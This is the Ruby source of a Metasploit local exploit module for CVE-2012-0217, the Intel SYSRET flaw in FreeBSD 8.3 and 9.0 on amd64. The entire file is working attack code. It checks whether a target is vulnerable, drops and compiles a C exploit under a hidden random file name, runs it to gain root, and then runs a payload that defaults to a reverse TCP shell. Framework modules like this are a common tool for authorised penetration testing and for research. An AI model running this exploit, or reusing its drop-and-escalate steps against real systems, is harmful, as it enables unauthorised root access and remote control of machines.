# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;FreeBSD Intel SYSRET Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the FreeBSD kernel,
        when running on 64-bit Intel processors.

        By design, 64-bit processors following the X86-64 specification will
        trigger a general protection fault (GPF) when executing a SYSRET
        instruction with a non-canonical address in the RCX register.

        However, Intel processors check for a non-canonical address prior to
        dropping privileges, causing a GPF in privileged mode. As a result,
        the current userland RSP stack pointer is restored and executed,
        resulting in privileged code execution.

        This module has been tested successfully on:

        FreeBSD 8.3-RELEASE (amd64); and
        FreeBSD 9.0-RELEASE (amd64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Rafal Wojtczuk&#039;,  # Discovery
          &#039;John Baldwin&#039;,    # Discovery
          &#039;iZsh&#039;,            # Exploit
          &#039;bcoles&#039;           # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2012-06-12&#039;,
      &#039;Platform&#039;       => [&#039;bsd&#039;],
      &#039;Arch&#039;           => [ARCH_X64],
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;53856&#039;],
          [&#039;CVE&#039;, &#039;2012-0217&#039;],
          [&#039;EDB&#039;, &#039;28718&#039;],
          [&#039;PACKETSTORM&#039;, &#039;113584&#039;],
          [&#039;URL&#039;, &#039;https://www.freebsd.org/security/patches/SA-12:04/sysret.patch&#039;],
          [&#039;URL&#039;, &#039;https://blog.xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/&#039;],
          [&#039;URL&#039;, &#039;https://github.com/iZsh/exploits/blob/master/stash/CVE-2012-0217-sysret/CVE-2012-0217-sysret_FreeBSD.c&#039;],
          [&#039;URL&#039;, &#039;https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/&#039;],
          [&#039;URL&#039;, &#039;http://security.freebsd.org/advisories/FreeBSD-SA-12:04.sysret.asc&#039;],
          [&#039;URL&#039;, &#039;https://www.slideshare.net/nkslides/exploiting-the-linux-kernel-via-intels-sysret-implementation&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;bsd/x64/shell_reverse_tcp&#039; },
      &#039;DefaultTarget&#039;  => 0))
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
  end

  def upload_and_compile(path, data, gcc_args=&#039;&#039;)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
    chmod path
  end

  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2012-0217&#039;, file)
  end

  def is_root?
    (cmd_exec(&#039;id -u&#039;).to_s.gsub(/[^\d]/, &#039;&#039;) == &#039;0&#039;)
  end

  def strip_comments(c_code)
    c_code.gsub(%r{/\*.*?\*/}m, &#039;&#039;).gsub(%r{^\s*//.*$}, &#039;&#039;)
  end

  def check
    kernel_release = cmd_exec(&#039;uname -r&#039;).to_s
    unless kernel_release =~ /^(8\.3|9\.0)-RELEASE/
      vprint_error "FreeBSD version #{kernel_release} is not vulnerable"
      return Exploit::CheckCode::Safe
    end
    vprint_good "FreeBSD version #{kernel_release} appears vulnerable"

    arch = cmd_exec(&#039;uname -m&#039;).to_s
    unless arch.include? &#039;64&#039;
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"

    hw_model = cmd_exec(&#039;/sbin/sysctl hw.model&#039;).to_s
    unless hw_model.downcase.include? &#039;intel&#039;
      vprint_error "#{hw_model} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "#{hw_model} is vulnerable"

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload and compile exploit executable
    executable_name = ".#{rand_text_alphanumeric 5..10}"
    executable_path = "#{base_dir}/#{executable_name}"
    upload_and_compile executable_path, strip_comments(exploit_data(&#039;sysret.c&#039;)), &#039;-Wall&#039;

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status &#039;Launching exploit...&#039;
    output = cmd_exec executable_path
    output.each_line { |line| vprint_status line.chomp }

    unless is_root?
      fail_with Failure::Unknown, &#039;Exploitation failed&#039;
    end
    print_good "Success! Executing payload..."

    cmd_exec payload_path
  end
end

